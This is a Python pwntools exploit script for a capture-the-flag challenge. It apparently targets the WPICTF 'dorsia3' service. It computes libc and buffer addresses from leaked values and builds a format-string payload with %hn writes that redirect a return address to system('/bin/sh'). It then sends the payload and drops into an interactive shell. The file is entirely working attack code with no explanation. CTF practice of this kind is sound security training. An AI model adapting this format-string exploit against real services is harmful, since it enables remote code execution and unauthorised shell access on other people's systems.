from pwn import *

bin_sh_offset = 0x0017e0cf # remote
system_offset = 0x0003d200 # remote 


def perform_writes(where1, system, where2, bin_sh):
    """
    we want to write system to ret_addr and /bin/sh address to ret_addr + 8
    ret_addr computed from buf_addr
    /bin/sh computed from buf_addr
    """

    system_upper = system >> 16
    system_lower = system & 0xffff
    bin_sh_upper = bin_sh >> 16
    bin_sh_lower = bin_sh & 0xffff

    
    payload = b'%'
    payload += str(system_upper).encode('ascii')
    payload += b'c%19$hn%'
    num_written = system_upper
    next_write = (bin_sh_upper - num_written) % 2**16
    payload += str(next_write).encode('ascii')
    payload += b'c%20$hn%'
    num_written = (num_written + next_write) % 2**16
    next_write = (system_lower - num_written) % 2**16
    payload += str(next_write).encode('ascii')
    payload += b'c%21$hn%'
    num_written = (num_written + next_write) % 2**16
    next_write = (bin_sh_lower - num_written) % 2**16
    payload += str(next_write).encode('ascii')
    payload += b'c%22$hn'
    
    payload += (49 - len(payload))*b'A' # the write destinations need to be aligned
    
    payload += p32(where1 + 2)
    payload += p32(where2 + 2)
    payload += p32(where1)
    payload += p32(where2)

    print(payload)
    print(len(payload))
    
    return payload

def compute(buf_addr, libc_base):
    # return addr of return addres, param, system, /bin/sh
    # 113 and 121 are offsets to ret_place and argument for system
    return (buf_addr + 113, buf_addr + 121, libc_base + system_offset, libc_base+bin_sh_offset)

def compute_libc_base(libc_leak):
    # we are given address of system - 0x120, so need to subract it
    return libc_leak + 0x120 - system_offset

r = remote('dorsia3.wpictf.xyz', 31338)

buffer_addr = int(r.recv(10), 16)
libc_leak = int(r.recv(10), 16)
r.recvline()

libc_base = compute_libc_base(libc_leak)

print(f'[|] Leaked buffer at: {hex(buffer_addr)}')
print(f'[|] Computed libc at: {hex(libc_base)}')

addrs = compute(buffer_addr,libc_base)
payload = perform_writes(addrs[0], addrs[2], addrs[1], addrs[3])

print(f'[|] Sending payload: {payload}')
r.sendline(payload)
r.recvline()
r.interactive()

